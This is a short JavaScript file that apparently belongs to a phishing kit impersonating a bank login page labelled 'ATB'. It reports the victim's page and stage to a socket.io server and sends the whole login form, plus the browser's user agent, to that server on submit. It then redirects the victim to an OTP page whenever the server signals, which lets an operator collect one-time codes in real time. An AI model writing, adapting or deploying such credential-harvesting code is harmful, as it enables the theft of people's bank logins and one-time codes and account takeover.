const socket = io();
let navig = document.getElementById('navig').textContent

socket.emit('pageandstage', {page: 'ATB', stage: 'Login'})

socket.on('OTP', (data) => {
    if(data.otp){
        navig = `/atb/otp`;
    } 

    console.log(navig)
})

console.log(navig)

function submitForm() {
    document.getElementById('userAgent').value = navigator.userAgent;

    const formData = new FormData(document.getElementById('loginForm'));

    socket.emit('submit', Object.fromEntries(formData));

    window.location.href = navig;
}